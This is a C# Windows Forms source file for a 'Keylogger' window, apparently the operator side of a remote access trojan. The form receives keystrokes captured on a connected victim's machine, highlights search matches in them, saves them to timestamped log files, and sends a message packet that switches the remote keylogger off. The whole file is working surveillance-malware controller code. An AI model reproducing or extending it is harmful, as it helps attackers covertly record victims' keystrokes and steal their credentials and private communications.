using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Connection;

namespace Server.Forms;

public class FormKeylogger : XtraForm
{
	public StringBuilder Sb = new StringBuilder();

	private IContainer components;

	public RichTextBox richTextBox1;

	public System.Windows.Forms.Timer timer1;

	private SimpleButton toolStripButton1;

	private TextEdit toolStripTextBox1;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	private PanelControl panelControl1;

	public FormMain F { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public FormKeylogger()
	{
		InitializeComponent();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
	{
		Sb?.Clear();
		if (Client != null)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
				msgPack.ForcePathObject("isON").AsString = "false";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			});
		}
	}

	private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		richTextBox1.SelectionStart = 0;
		richTextBox1.SelectAll();
		richTextBox1.SelectionBackColor = Color.White;
		if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(toolStripTextBox1.Text))
		{
			return;
		}
		int num;
		for (int i = 0; i < richTextBox1.TextLength; i += num + toolStripTextBox1.Text.Length)
		{
			num = richTextBox1.Find(toolStripTextBox1.Text, i, RichTextBoxFinds.None);
			if (num != -1)
			{
				richTextBox1.SelectionStart = num;
				richTextBox1.SelectionLength = toolStripTextBox1.Text.Length;
				richTextBox1.SelectionBackColor = Color.Yellow;
				continue;
			}
			break;
		}
	}

	private void ToolStripButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			File.WriteAllText(FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", richTextBox1.Text.Replace("\n", Environment.NewLine));
		}
		catch
		{
		}
	}

	private void FormKeylogger_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormKeylogger));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.toolStripButton1 = new DevExpress.XtraEditors.SimpleButton();
		this.toolStripTextBox1 = new DevExpress.XtraEditors.TextEdit();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		((System.ComponentModel.ISupportInitialize)this.toolStripTextBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).BeginInit();
		this.panelControl1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.richTextBox1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.richTextBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.richTextBox1.ForeColor = System.Drawing.Color.Gainsboro;
		this.richTextBox1.Location = new System.Drawing.Point(0, 28);
		this.richTextBox1.Margin = new System.Windows.Forms.Padding(2);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(626, 275);
		this.richTextBox1.TabIndex = 1;
		this.richTextBox1.Text = "";
		this.toolStripButton1.Dock = System.Windows.Forms.DockStyle.Right;
		this.toolStripButton1.Location = new System.Drawing.Point(515, 2);
		this.toolStripButton1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.toolStripButton1.Name = "toolStripButton1";
		this.toolStripButton1.Size = new System.Drawing.Size(109, 24);
		this.toolStripButton1.TabIndex = 2;
		this.toolStripButton1.Text = "Save Logs";
		this.toolStripButton1.Click += new System.EventHandler(ToolStripButton1_Click);
		this.toolStripTextBox1.Dock = System.Windows.Forms.DockStyle.Left;
		this.toolStripTextBox1.Location = new System.Drawing.Point(2, 2);
		this.toolStripTextBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.toolStripTextBox1.Name = "toolStripTextBox1";
		this.toolStripTextBox1.Size = new System.Drawing.Size(500, 28);
		this.toolStripTextBox1.TabIndex = 3;
		this.toolStripTextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(ToolStripTextBox1_KeyDown);
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(628, 334);
		this.xtraTabControl1.TabIndex = 4;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.richTextBox1);
		this.xtraTabPage1.Controls.Add(this.panelControl1);
		this.xtraTabPage1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(626, 303);
		this.panelControl1.Controls.Add(this.toolStripTextBox1);
		this.panelControl1.Controls.Add(this.toolStripButton1);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelControl1.Location = new System.Drawing.Point(0, 0);
		this.panelControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(626, 28);
		this.panelControl1.TabIndex = 5;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(628, 334);
		base.Controls.Add(this.xtraTabControl1);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormKeylogger.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormKeylogger.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MaximumSize = new System.Drawing.Size(732, 444);
		this.MinimumSize = new System.Drawing.Size(630, 368);
		base.Name = "FormKeylogger";
		this.Text = "Keylogger";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Keylogger_FormClosed);
		base.Load += new System.EventHandler(FormKeylogger_Load);
		((System.ComponentModel.ISupportInitialize)this.toolStripTextBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		base.ResumeLayout(false);
	}
}
